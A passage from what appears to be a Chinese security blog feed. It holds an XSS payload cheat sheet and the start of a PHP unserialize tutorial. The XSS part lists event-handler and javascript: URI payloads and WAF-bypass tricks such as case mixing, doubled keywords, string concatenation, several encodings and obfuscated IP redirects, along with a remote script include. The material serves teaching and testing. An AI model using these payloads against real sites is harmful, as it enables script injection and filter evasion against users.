class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span>  <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;body&gt;</code></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure></div><p>利用换行符以及 autofocus，自动去触发 onscroll 事件，无需用户去触发</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span></span></span><br><span class="line"><span class="tag"><span class="attr">onscroll</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;textarea&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;); <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;keygen&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span> //仅限火狐</span><br></pre></td></tr></table></figure></div><p><code>&lt;marquee&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure></div><p><code>&lt;isindex&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>//仅限于IE</span><br></pre></td></tr></table></figure></div><p>利用 link 远程包含 js 文件</p><p><strong>PS：在无 CSP 的情况下才可以</strong></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">import</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/1.js&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="javascript伪协议"><a class="markdownIt-Anchor" href="#javascript伪协议">#</a> javascript 伪协议</h3><p><a>标签</a></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(`xss`);&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;iframe&gt;</code>  标签</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;img&gt;</code>  标签</p><div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(<span class="string">&#x27;xss&#x27;</span>)&gt;<span class="comment">//IE7以下</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;form&gt;</code>  标签</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;Javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="其它"><a class="markdownIt-Anchor" href="#其它">#</a> 其它</h3><p><code>expression</code>  属性</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style=<span class="string">&quot;xss:expression(alert(&#x27;xss&#x27;&#x27;))&quot;</span>&gt; <span class="comment">// IE7以下</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:rgb(&#x27;&#x27;�x:expression(alert(1))&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span> <span class="comment">//IE7以下</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-id">#test</span>&#123;x:<span class="built_in">expression</span>(<span class="built_in">alert</span>(/XSS/))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span> <span class="comment">// IE7以下</span></span><br></pre></td></tr></table></figure></div><p><code>background</code>  属性</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span> //在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure></div><h2 id="绕过过滤"><a class="markdownIt-Anchor" href="#绕过过滤">#</a> 绕过过滤</h2><h3 id="1空格"><a class="markdownIt-Anchor" href="#1空格">#</a> 1. 空格</h3><p>用 <code>/</code>  代替空格:  <code>&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code></p><h3 id="2过滤关键词"><a class="markdownIt-Anchor" href="#2过滤关键词">#</a> 2. 过滤关键词</h3><h4 id="大小写绕过"><a class="markdownIt-Anchor" href="#大小写绕过">#</a> 大小写绕过</h4><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="双写关键字"><a class="markdownIt-Anchor" href="#双写关键字">#</a> 双写关键字</h4><p>有些 waf 可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="字符拼接"><a class="markdownIt-Anchor" href="#字符拼接">#</a> 字符拼接</h4><h5 id="利用eval"><a class="markdownIt-Anchor" href="#利用eval">#</a> 利用 eval</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="利用top"><a class="markdownIt-Anchor" href="#利用top">#</a> 利用 top</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="其它字符混淆"><a class="markdownIt-Anchor" href="#其它字符混淆">#</a> 其它字符混淆</h4><p>有的 waf 可能是用正则表达式去检测是否有 xss 攻击，如果我们能 fuzz 出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">1.&lt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2.<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=&lt;/<span class="attr">title</span>&gt;</span>&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(`xss`);&quot;</span>&gt;</span> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">3.<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> a=<span class="string">&quot;\\&quot;</span>;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);<span class="comment">//&quot;;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="编码绕过"><a class="markdownIt-Anchor" href="#编码绕过">#</a> 编码绕过</h4><h5 id="unicode编码绕过"><a class="markdownIt-Anchor" href="#unicode编码绕过">#</a> Unicode 编码绕过</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span>&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="url编码绕过"><a class="markdownIt-Anchor" href="#url编码绕过">#</a> url 编码绕过</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="ascii码绕过"><a class="markdownIt-Anchor" href="#ascii码绕过">#</a> Ascii 码绕过</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="hex绕过"><a class="markdownIt-Anchor" href="#hex绕过">#</a> hex 绕过</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="八进制"><a class="markdownIt-Anchor" href="#八进制">#</a> 八进制</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="base64绕过"><a class="markdownIt-Anchor" href="#base64绕过">#</a> base64 绕过</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="3过滤引号"><a class="markdownIt-Anchor" href="#3过滤引号">#</a> 3. 过滤引号</h3><p>1. 如果是 html 标签中，我们可以不用引号。如果是在 js 中，我们可以用反引号代替单双引号</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`);&gt;</span></span><br></pre></td></tr></table></figure></div><p>2. 使用编码绕过，具体看上面我列举的例子</p><h3 id="4过滤括号"><a class="markdownIt-Anchor" href="#4过滤括号">#</a> 4. 过滤括号</h3><p>使用 throw 绕过</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure></div><h3 id="5过滤url地址"><a class="markdownIt-Anchor" href="#5过滤url地址">#</a> 5. 过滤 url 地址</h3><h4 id="使用url编码"><a class="markdownIt-Anchor" href="#使用url编码">#</a> 使用 url 编码</h4><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="使用ip"><a class="markdownIt-Anchor" href="#使用ip">#</a> 使用 IP</h4><p>1. 十进制 IP</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><p>2. 八进制 IP</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><p>3.hex</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><p>4.html 标签中用 <code>//</code>  可以代替 <code>http://</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure></div><p>6. 使用中文逗号代替英文逗号<br>如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.location=`http://www。baidu。com`&quot;</span>&gt;</span>//会自动跳转到百度</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xss&quot;&gt;#&lt;/a&gt; XSS&lt;/h1&gt;
&lt;h2 id=&quot;跨站脚本攻击&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#跨站脚本攻击&quot;&gt;#&lt;/a&gt; 跨站脚本攻</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PHP Unserialize</title>
    <link href="http://example.com/2024/04/09/PHP-Unserialize/"/>
    <id>http://example.com/2024/04/09/PHP-Unserialize/</id>
    <published>2024-04-09T13:51:55.000Z</published>
    <updated>2024-04-11T12:30:08.434Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php-unserialize"><a class="markdownIt-Anchor" href="#php-unserialize">#</a> PHP Unserialize</h1><h2 id="什么是序列化和反序列化"><a class="markdownIt-Anchor" href="#什么是序列化和反序列化">#</a> 什么是序列化和反序列化</h2><p><strong>serialize</strong> 将对象格式化成有序的字符串</p><p><strong>unserialize</strong> 将字符串还原成原来的对象</p><h3 id="serialize的特征"><a class="markdownIt-Anchor" href="#serialize的特征">#</a> serialize 的特征</h3><p>常见的序列化格式有</p><blockquote><p>二进制格式</p><p>字节数组</p><p>json 字符串</p><p>xml 字符串</p></blockquote><p>常见的数组样例</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br></pre></td></tr></table></figure></div><p>输出  <code>a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</span><br><span class="line">a:array代表是数组，后面的3说明有三个属性</span><br><span class="line">i:代表是整型数据int，后面的0是数组下标</span><br><span class="line">s:代表是字符串，后面的4是因为xiao长度为4</span><br></pre></td></tr></table></figure></div><p>数据类型对应提示符</p><p><code>字符串：s</code></p><p><code>已转义字符串：S</code></p><p><code>整数：i</code></p><p><code>布尔值： b</code></p><p><code>空值：N</code></p><p><code>数组：a</code></p><p><code>对象：O</code></p><p><code>引用： R</code></p><p>关于非公有字段名称:</p><ul><li><code>private</code>  使用：私有的类的名称 (考虑到继承的情况) 和字段名组合  <code>\x00类名称\x00字段名</code></li><li><code>protected</code>  使用:  <code>*</code>  和字段名组合  <code>\x00*\x00字段名</code></li></ul><h3 id="魔术方法"><a class="markdownIt-Anchor" href="#魔术方法">#</a> 魔术方法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__construct() //构造函数, 在对应对象实例化时自动被调用. #子类中的构    造函数不会隐式调用父类的构造函数.在 PHP 8 以前, 与类名同名      的方法可以作为 __constuct 调用但 __construct 方法优先</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br><span class="line">__debugInfo() //在使用 var_dump, print_r 时会被调用</span><br><span class="line">__set_state()   // 调用var_export()导出类时，此静态方法会被调用</span><br><span class="line">__clone()       // 当对象复制完成时调用</span><br><span class="line">__autoload()    // 尝试加载未定义的类</span><br></pre></td></tr></table></figure></div><h3 id="反序列化绕过"><a class="markdownIt-Anchor" href="#反序列化绕过">#</a> 反序列化绕过</h3><h4 id="php71反序列化对类属性不敏感"><a class="markdownIt-Anchor" href="#php71反序列化对类属性不敏感">#</a> php7.1 + 反序列化对类属性不敏感</h4><p>我们前面说了如果变量前是 protected，序列化结果会在变量名前加上 <code>\x00*\x00</code></p><p>但在特定版本 7.1 以上则对于类属性不敏感，比如下面的例子即使没有 <code>\x00*\x00</code>  也依然会输出 <code>abc</code></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span 